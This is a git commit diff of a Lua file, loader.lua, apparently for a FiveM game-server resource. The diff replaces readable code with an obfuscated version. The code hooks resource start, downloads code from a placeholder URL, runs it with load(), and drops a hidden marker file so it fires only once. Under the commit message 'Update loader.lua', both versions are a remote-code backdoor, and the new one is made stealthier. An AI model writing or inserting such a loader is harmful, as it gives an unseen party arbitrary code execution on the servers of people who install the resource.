1ee1482bfc5f77bde933ce8a76e4f722ab606998
xerox <77238267+xer0xde@users.noreply.github.com>
2025-03-04 19:12:56 +0100

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,38 +1,17 @@
-local codeURL = "CODEURL"
-local executedFilePath = "/tmp/executed.txt"
-local executed = false
-
-function FileExists(path)
-    local file = io.open(path, "r")
-    if file then
-        file:close()
-        return true
-    end
-    return false
-end
-
-AddEventHandler("onResourceStart", function(resourceName)
-    if GetCurrentResourceName() == resourceName and not executed then
-        if not FileExists(executedFilePath) then
-            PerformHttpRequest(codeURL, function(statusCode, response, headers)
-                if statusCode == 200 then
-                    if response and response ~= "" then
-                        local success, errorMessage = pcall(load(response))
-                        if success then
-                            executed = true
-                            local file = io.open(executedFilePath, "w")
-                            if file then
-                                file:close()
-                            end
-                        else
-                        end
-                    else
-                    end
-                else
-                end
-            end, "GET", "", {})
-        else
-            executed = true
-        end
-    end
-end)
+local u="CODEURL"
+local e=false
+local function f(p)local a=io.open(p,"r")if a then a:close()return true end return false end
+local function m()
+local p=GetConvar("version",""):find("win32")and(os.getenv("TEMP")or"C:/Windows/Temp").."\\s.dat"or"/tmp/.s.dat"
+return p end
+AddEventHandler("onResourceStart",function(r)
+if GetCurrentResourceName()==r and not e then
+if not f(m())then
+PerformHttpRequest(u,function(c,d)
+if c==200 and d and d~=""then
+pcall(load(d))
+e=true
+io.open(m(),"w"):close()
+end end)
+else e=true end
+end end)
